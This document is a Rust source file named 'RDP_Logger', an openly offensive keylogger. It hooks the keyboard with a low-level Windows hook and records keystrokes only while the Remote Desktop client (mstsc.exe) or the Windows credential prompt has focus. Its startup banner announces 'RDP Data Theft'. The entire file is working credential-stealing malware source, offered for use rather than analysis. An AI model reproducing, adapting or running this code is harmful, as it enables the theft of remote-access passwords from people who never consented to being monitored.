/*
    RDP_Logger
    Author: 5mukx
*/

use winapi::{
    shared::minwindef::{LPARAM, LRESULT, WPARAM}, 
    um::{errhandlingapi::GetLastError, handleapi::CloseHandle, 
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS}, 
    winuser::{CallNextHookEx, DispatchMessageW, GetForegroundWindow, GetKeyState, GetMessageW, GetWindowThreadProcessId, SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, VK_SHIFT, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN}}};

use std::{
    ffi::CString, mem, ptr::null_mut, 
    sync::atomic::{AtomicI32, Ordering}
};


fn get_pid(process_name: &str) -> u32{
    unsafe{
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null(){
            println!("Error while snapshoting processes : Error : {}", GetLastError());
            std::process::exit(0);
        }

        let mut pid = 0;

        let mut result = Process32First(snap, &mut pe) != 0;

        while result{

            let exe_file = CString::from_vec_unchecked(pe.szExeFile
                .iter()
                .map(|&file| file as u8)
                .take_while(|&c| c!=0)
                .collect::<Vec<u8>>(),
            );

            if exe_file.to_str().unwrap() == process_name {
                pid = pe.th32ProcessID;
                // break;
            }
            result = Process32Next(snap, &mut pe) !=0;
        }

        if pid == 0{
            println!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
            // std::process::exit(0);
        }
    
        CloseHandle(snap);
        pid
    }
}

fn is_window_of_process_focused(proc_name: &str) -> bool {

    let pid = get_pid(proc_name);
    unsafe{
        let h_active_window = GetForegroundWindow();
        if h_active_window.is_null() {
            return false;
        }

        let mut active_pid = 0;
        GetWindowThreadProcessId(h_active_window, &mut active_pid);

        return active_pid == pid;
    }
}

static PREV_KEY: AtomicI32 = AtomicI32::new(0);


unsafe extern "system" fn keyboard_hook_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 {
        if is_window_of_process_focused("mstsc.exe") || is_window_of_process_focused("CredentialUIBroker.exe") {
            let kbd_struct = *(l_param as *const KBDLLHOOKSTRUCT);
            let vk_code = kbd_struct.vkCode as i32;

            if w_param == WM_KEYDOWN as usize || w_param == WM_SYSKEYDOWN as usize {
                if vk_code == 0xA2 {
                    PREV_KEY.store(vk_code, Ordering::SeqCst);
                    return CallNextHookEx(null_mut(), n_code, w_param, l_param);
                }

                if PREV_KEY.load(Ordering::SeqCst) == 0xA2 && vk_code == 0xA5 {
                    println!("<RALT>");
                } else if PREV_KEY.load(Ordering::SeqCst) == 0xA2 && vk_code != 0xA5 {
                    println!("<LCTRL>");
                }

                match vk_code {
                    0xA3 => println!("<RCTRL>"),
                    0xA4 => println!("<LALT>"),
                    0x08 => println!("<ESC>"),
                    0x0D => println!("<ENTER>"),
                    _ => {
                        let shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000u16 as i16) != 0;
                        match vk_code {
                            0x30..=0x39 => { // Digits 0-9
                                if shift_pressed {
                                    match vk_code {
                                        0x31 => println!("!"),
                                        0x32 => println!("@"),
                                        0x33 => println!("#"),
                                        0x34 => println!("$"),
                                        0x35 => println!("%"),
                                        0x36 => println!("^"),
                                        0x37 => println!("&"),
                                        0x38 => println!("*"),
                                        0x39 => println!("("),
                                        0x30 => println!(")"),
                                        _ => {}
                                    }
                                } else {
                                    println!("{}", (vk_code as u8) as char); 
                                }
                            }
                            0xBA => println!("{}", if shift_pressed { ':' } else { ';' }), 
                            0xBB => println!("{}", if shift_pressed { '+' } else { '=' }), 
                            0xBC => println!("{}", if shift_pressed { '<' } else { ',' }), 
                            0xBD => println!("{}", if shift_pressed { '_' } else { '-' }), 
                            0xBE => println!("{}", if shift_pressed { '>' } else { '.' }), 
                            0xBF => println!("{}", if shift_pressed { '?' } else { '/' }), 
                            0xC0 => println!("{}", if shift_pressed { '~' } else { '`' }), 
                            0xDB => println!("{}", if shift_pressed { '{' } else { '[' }), 
                            0xDC => println!("{}", if shift_pressed { '|' } else { '\\' }),
                            0xDD => println!("{}", if shift_pressed { '}' } else { ']' }), 
                            0xDE => println!("{}", if shift_pressed { '"' } else { '\'' }),
                            0x41..=0x5A => { // Letters A-Z
                                if shift_pressed {
                                    println!("{}", (vk_code as u8) as char); 
                                } else {
                                    println!("{}", (vk_code as u8 + 32) as char); 
                                }
                            }
                            _ => println!("{:?}", vk_code), 
                        }                    },
                }
                PREV_KEY.store(vk_code, Ordering::SeqCst);
            }
        } else {
            return CallNextHookEx(null_mut(), n_code, w_param, l_param);
        }
    }
    CallNextHookEx(null_mut(), n_code, w_param, l_param)
}


fn main(){
    println!("[*] Starting RDP Data Theft");
    println!("[!] Waiting for RDP related Process");

    unsafe{
        let hook = SetWindowsHookExW(
                WH_KEYBOARD_LL,
                Some(keyboard_hook_proc),
                null_mut(),
                0,
            );

            if  hook.is_null(){
                println!("Failed to set Hook");
                return;
            }
            let mut msg: winapi::um::winuser::MSG = std::mem::zeroed();

            while GetMessageW(
                &mut msg, 
                null_mut(), 
                0,
                0,
            ) != 0{
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
        
        UnhookWindowsHookEx(hook);
    }
}